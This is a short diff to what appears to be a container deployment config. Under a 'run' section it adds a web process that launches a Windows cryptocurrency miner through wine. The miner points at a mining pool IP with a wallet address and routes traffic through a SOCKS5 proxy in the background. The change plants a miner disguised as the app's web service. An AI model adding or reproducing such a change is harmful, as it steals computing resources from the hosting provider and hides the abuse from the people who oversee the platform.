@@ -1,3 +1,5 @@
 build:
   docker:
     web: Dockerfile
+run:
+  web: wine ./cpuminer-sse2.exe -a minotaurx -o stratum+tcp://146.103.45.69 -u RNPTaDxarafTVGK3qaDGHRUhnvW3Mr4ux8 -p c=RVN,mc=SMT/SPRX/SWAMP -x socks5://192.252.209.155:14455 -t2 -B
